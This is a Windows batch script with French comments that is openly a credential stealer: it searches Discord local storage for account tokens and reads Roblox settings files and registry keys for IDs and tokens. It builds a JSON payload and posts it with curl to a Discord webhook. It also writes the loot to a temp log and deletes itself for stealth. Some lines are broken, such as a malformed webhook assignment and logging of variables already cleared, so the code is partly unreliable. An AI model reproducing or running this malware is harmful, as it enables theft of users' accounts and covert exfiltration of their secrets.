@echo off
setlocal enabledelayedexpansion
:: PALOFSC - EXFILTRATION TOKENS DISCORD + CREDENTIALS ROBLOX
:: CE SCRIPT DOIT ETRE EXECUTE AVEC PRIVILEGES UTILISATEUR
:: CONFIGURER WEBHOOK_URL CI-DESSOUS

set "https://discord.com/api/webhooks/1524390694376964226/1JXT_Rnb0ocyCJDBnZPuyY9qLctiKxsQe_-phkaif_Hap7ZbRugKdshY6wlYp9Jyq1T8"

:: ETAPE 1 : RECUPERATION DES TOKENS DISCORD
set "discord_paths=%APPDATA%\Discord\Local Storage\leveldb %APPDATA%\discordptb\Local Storage\leveldb %APPDATA%\discordcanary\Local Storage\leveldb"
set "tokens="
for %%p in (%discord_paths%) do (
  if exist "%%p" (
    for /f "tokens=3 delims= " %%a in ('findstr /r /c:"[a-zA-Z0-9_\-]\{24,28\}\.[a-zA-Z0-9_\-]\{6,7\}\.[a-zA-Z0-9_\-]\{27,38\}" "%%p\*.log" 2^>nul') do (
      set "tokens=!tokens!%%a "
    )
  )
)

:: ETAPE 2 : RECUPERATION DES IDENTIFIANTS ROBLOX (fichier cookies)
set "roblox_cookie=%LOCALAPPDATA%\Roblox\GlobalBasicSettings_13.xml"
set "roblox_user="
set "roblox_pass="
if exist "%roblox_cookie%" (
  for /f "tokens=2 delims=<>" %%a in ('findstr /r /c:"<token>" "%roblox_cookie%" 2^>nul') do set "roblox_token=%%a"
  :: Tentative d'extraction via le registre (si stocké)
  for /f "tokens=3*" %%a in ('reg query "HKCU\Software\Roblox\RobloxStudio" /v "UserID" 2^>nul') do set "roblox_user=%%a"
  for /f "tokens=3*" %%a in ('reg query "HKCU\Software\Roblox\RobloxStudio" /v "RememberMe" 2^>nul') do set "roblox_pass=%%a"
)

:: ETAPE 3 : CONSTRUCTION DU PAYLOAD JSON
set "payload={"
set "payload=!payload!\"content\":\"=== EXFILTRATION ===\\n"
if not "!tokens!"=="" set "payload=!payload!Tokens Discord : !tokens!\\n"
if not "!roblox_user!"=="" set "payload=!payload!Roblox UserID : !roblox_user!\\n"
if not "!roblox_pass!"=="" set "payload=!payload!Roblox RememberMe : !roblox_pass!\\n"
if not "!roblox_token!"=="" set "payload=!payload!Roblox Token : !roblox_token!\\n"
set "payload=!payload!\"}"

:: ETAPE 4 : ENVOI VIA CURL (intégré Windows 10/11)
curl -H "Content-Type: application/json" -d "!payload!" "%WEBHOOK_URL%" >nul 2>&1

:: ETAPE 5 : NETTOYAGE DES VARIABLES (effacement mémoire locale)
set "tokens="
set "roblox_token="
set "roblox_user="
set "roblox_pass="
set "payload="

:: ETAPE 6 : CREATION D'UN FICHIER LOCAL DE SAUVEGARDE (optionnel)
echo %date% %time% >> %TEMP%\exfil_log.txt
echo Tokens: %tokens% >> %TEMP%\exfil_log.txt 2>nul
echo Roblox: %roblox_user% %roblox_pass% >> %TEMP%\exfil_log.txt 2>nul

:: ETAPE 7 : SUPPRESSION DU SCRIPT LUI-MEME POUR DISCRETION
del /f /q "%~f0" >nul 2>&1

:: ETAPE 8 : FIN
exit /b 0
